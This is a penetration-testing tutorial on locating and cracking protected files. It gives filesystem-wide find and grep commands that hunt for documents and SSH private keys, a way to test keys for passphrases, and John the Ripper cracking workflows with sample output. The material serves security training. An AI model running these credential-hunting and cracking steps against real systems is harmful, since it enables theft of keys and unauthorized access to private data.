# Cracking Protected Files

## Table of Contents
- [Why this matters](#why-this-matters)
- [Step 1: Finding encrypted files in the first place](#step-1-finding-encrypted-files-in-the-first-place)
  - [By file extension](#by-file-extension)
  - [By content, for files with no distinctive extension](#by-content-for-files-with-no-distinctive-extension)
- [Step 2: Checking if a key is passphrase-protected](#step-2-checking-if-a-key-is-passphrase-protected)
- [Step 3: Cracking the protected file](#step-3-cracking-the-protected-file)
- [The real bottleneck: your wordlist](#the-real-bottleneck-your-wordlist)

---

## Why this matters

A lot of sensitive stuff — job applications, bank statements, contracts — still gets emailed around completely unencrypted, even though regulations like the EU's **GDPR** technically require personal data to be protected both in transit and at rest. As companies get better at security training, more employees have started encrypting individual files before sharing them. But "encrypted" doesn't mean "uncrackable" — with the right wordlist and tooling, a lot of these files can still be opened.

Two quick encryption basics:
- **Symmetric encryption** (e.g., AES-256): the *same* key both locks and unlocks the file. Common for protecting a single file or folder.
- **Asymmetric encryption**: *two different* keys — the sender locks the file with the recipient's **public key**, and only the recipient's matching **private key** can unlock it. Common when sending files to someone else.

This section is about cracking **actual encrypted files** — SSH keys, Office docs, PDFs, etc.

---

## Step 1: Finding encrypted files in the first place

### By file extension

Encrypted/protected files often have telltale extensions (`.pdf`, `.docx`, `.xls`, `.ods`, etc.). A quick loop can search a whole filesystem for common ones:

```bash
$ for ext in .xls .xls* .xltx .od* .doc .doc* .pdf .pot* .pp*; do
    echo -e "\nFile extension: $ext"
    find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
  done
```

```
File extension:  .od*
/home/target/Docs/document-temp.odt
/home/target/Docs/product-improvements.odp
/home/target/Docs/mgmt-spreadsheet.ods
```

If you come across an unfamiliar extension, it's completely normal to just search the web for it — nobody memorizes every file type that exists.

### By content, for files with no distinctive extension

Some sensitive files — like **SSH private keys** — don't use a special extension at all. Instead, you can recognize them by a standard text pattern they always contain, like the line:

```
-----BEGIN [...] PRIVATE KEY-----
```

`grep` can search recursively for this pattern across the whole filesystem:

```bash
$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

```
/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

---

## Step 2: Checking if a key is passphrase-protected

Older-style SSH keys openly state in their header if they're encrypted:

```bash
$ cat /home/jsmith/.ssh/SSH.private
```
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
<SNIP>
```

Newer key formats, though, look identical whether or not they're protected — so the header alone can't tell you. Instead, try reading the key with `ssh-keygen`:

```bash
$ ssh-keygen -yf ~/.ssh/id_ed25519
```

If it's **not** protected, it just prints the public key immediately:
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6
```

If it **is** protected, it instead prompts for a password:
```bash
$ ssh-keygen -yf ~/.ssh/id_rsa
Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```

---

## Step 3: Cracking the protected file

Remember the "2john" conversion tools from earlier (`ssh2john`, `office2john`, `pdf2john`, etc.)? This is exactly where they come in — they turn a protected file into a hash format John the Ripper can crack, following the same general pattern every time:

```
<file>2john <protected_file> > hash_file
john --wordlist=<wordlist> hash_file
john hash_file --show
```

### Example: cracking an SSH key

```bash
$ ssh2john.py SSH.private > ssh.hash
$ john --wordlist=rockyou.txt ssh.hash
```

```
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH ...])
1234         (SSH.private)
1g 0:00:00:00 DONE
Session completed
```

```bash
$ john ssh.hash --show
SSH.private:1234
1 password hash cracked, 0 left
```

### Example: cracking a password-protected Word document

```bash
$ office2john.py Protected.docx > protected-docx.hash
$ john --wordlist=rockyou.txt protected-docx.hash
$ john protected-docx.hash --show
```

```
Protected.docx:1234
1 password hash cracked, 0 left
```

### Example: cracking a password-protected PDF

Same process, just swap the conversion script:

```bash
$ pdf2john.py PDF.pdf > pdf.hash
$ john --wordlist=rockyou.txt pdf.hash
$ john pdf.hash --show
```

```
PDF.pdf:1234
1 password hash cracked, 0 left
```

Notice the pattern repeats identically across file types — only the "2john" conversion tool changes; the cracking command stays the same.

---

## The real bottleneck: your wordlist

The hardest part of this whole process usually isn't the tooling — it's having a **good enough wordlist**. Generic public lists like `rockyou.txt` are so well-known that some systems actively detect and block attempts using them. And as more people switch to long, randomly-generated passwords or passphrases, some files simply won't be crackable in any reasonable amount of time using these methods.

Still, it's often worth the attempt — protected documents frequently contain sensitive information that can open doors to further access, even when cracking the "easy" targets first (reused passwords, weak passphrases) is all that succeeds.

---

## Quick Recap

| Step | Tool/Technique |
|------|------------------|
| Find encrypted files by extension | `find` + a loop over known extensions |
| Find SSH keys with no extension | `grep` for the `BEGIN ... PRIVATE KEY` header |
| Check if a key needs a passphrase | `ssh-keygen -yf <key>` |
| Convert a protected file into a crackable hash | the right `*2john` script |
| Actually crack the hash | `john --wordlist=<list> <hash_file>` |

**Key idea:** Cracking a protected file is really a two-stage problem — first *finding* and *converting* it into a crackable hash, then applying the same wordlist/rule techniques covered earlier. The real limiting factor is almost always wordlist quality, not the tooling itself.
